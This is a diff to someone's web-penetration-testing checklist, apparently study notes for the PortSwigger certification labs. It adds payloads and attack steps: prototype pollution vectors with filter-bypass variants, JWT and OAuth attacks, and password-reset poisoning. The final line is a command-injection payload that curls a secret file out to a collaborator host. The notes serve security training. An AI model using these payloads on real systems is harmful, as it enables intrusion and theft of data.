@@ -12,7 +12,15 @@
 - If webcache poisoning, can use `Origin` header as a cache buster
 - If blog posting is allowed, see HTTP Request Smuggling (XSS too obviously)
 - Check the trackingid cookie for SQL
-
+- Graphql Endpoints
+    - ```
+      /graphql
+      /api
+      /api/graphql
+      /graphql/api
+      /graphql/graphql
+      ```
+- 
 **Do before anything else:**
 - scan all found parameters
 - Crawl
@@ -41,6 +49,19 @@
 - Check if app is HTTP/2 (if so, see H2 HTTP Request Smuggling labs)
 - Check for any serialized cookies 
 - Check for `/.git`. *From: Information disclosure in version control history*
+- Try the prototype pollution vectors as a query string:
+    - `/?__proto__[foo]=bar`
+    - `/?__proto__.foo=bar`
+    - If either work turn on DOM invader and it will find a proof of concept
+    - If neither work, try inserting a dulpicate of the word to get around sanitization:
+        - ```
+            /?__pro__proto__to__[foo]=bar
+            /?__pro__proto__to__.foo=bar
+            /?constconstructorructor[protoprototypetype][foo]=bar
+            /?constconstructorructor.protoprototypetype.foo=bar
+          ```
+        - Then follow the manual solution in `Lab: Client-side prototype pollution via flawed sanitization`
+    - It might be useful to run DOM invader if stuck
 
 ## My Account
 
@@ -51,11 +72,13 @@
 - Account Brute force
     - If valid username found with methods above, brute force the password.
     - Else Cluster bomb all usernames and passwords
+- Check to see if info comes from or goes to GraphQL endpoint
 
 ## Password reset
 
 - Send a POST request to forgot password with the username carlos (or another username if identified from above). Intercept and include the header `X-Forwarded-Host` pointing to collab. See if collab gets a hit with the URL including the token. 
     - Do the same as above but with the `Host` header as the collab server (try this for getting carlos and admin, as only the token might be disclosed, not the url path needed for the password reset) *From: Basic password reset poisoning*
+- See if you can truncate the request with %23 (#) `API testing`
 
 ## Admin panel 
 
@@ -75,7 +98,8 @@
 ## View Blog Post
 
 - Scan `postId` (or whatever it may be) parameter, i.e. `/post?postId=1`
-- See if you can post comments 
+- See if you can post comments
+- Check to see if posts come from GraphQL endpoint
 
 
 
@@ -89,6 +113,11 @@
 - See if there are pages you have access to now that you didnt before that an admin user might be visiting. Could do XSS (if xss exists) to CSRF to change the admin's email. *From: "Exploiting XSS to perform CSRF"*
 - If there is an encrypted `stay-logged-in` cookie, see *Authentication bypass via encryption oracle*
 - When gotten carlos's account, change email to the attacker's email provided. Try the same password reset poisoning methods from above (under password reset) by including the `X-Forwarded-Host` or changing the `Host` headers.
+- OAUTH recon endpoints
+    - ```
+      /.well-known/oauth-authorization-server
+      /.well-known/openid-configuration
+      ```
 
 ## Admin Panel
 
@@ -117,6 +146,28 @@
 - If a change password feature exists, see if `current-password` is even required. If not, change username to administrator.
     - See if the password change request has a username field. Try to put in `administrator`. Check for behavior similar to "Password brute-force via password change"
     - If the `temp-forgot-password-token` shows up in both URL and request body, see if removing them is still accepted by the server (only really matters if you can edit the `username` field too)
+- See if you have to sign in with social media `OAUTH`
+    - See if you can change the information sent in the `/authenticate` request
+    - See if there is a registration endpoint
+    - Check for an `/oauth-linking` endpoint
+    - Check the redirect-uri to see if it allows path traversal or arbitrary values
+- Look for JWTs
+    - Check to see if you can just edit the items
+    - Check for RS256 or HS256
+        - RS256
+            - Check for JWK header injection
+            - Try adding a JKU header
+        - HS256
+            - Check for no signature
+            - Attempt to brute force key
+            - Try to use kid path traversal with`/dev/null` and a empty key
+- If you can change user info,
+    - Fuzz for prototype pollution by using `"__proto__": { "status":555 }`  or `"constructor": { "prototype": { "json spaces":10 } }` as a parameter
+        - To see the JSON spaces you must be in the RAW view
+    - Check for GraphQL enpoints
+- Check for race condition see `Lab: Bypassing rate limits via race conditions`, `Lab: Single-endpoint race conditions`, `Lab: Exploiting time-sensitive vulnerabilities`
+- Fuzz for NoSQL injection
+- Check for /api
 
 ## Advanced Search
 - Insertion point scan any parameters and forms. (SQLi from practice exam)
@@ -150,3 +201,6 @@
 - Insertion point scan any and all new parameters
     - XXE, SSTI, Command Injection, Directory Traversal mainly, potentially SQLi. Perhaps SSRF to that internal host they say is listening (localhost on port 6566)
         - SSTI fuzz string: `${{<%[%'"}}%\`
+- See if any JSON data is being sent
+    - Check for prototype pollution with `"__proto__": { "json spaces":10 }` or `"constructor": { "prototype": { "json spaces":10 } }`
+        -Command injection: `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl -X POST <your-collaborator> -d @/home/carlos/secret')" ] }`
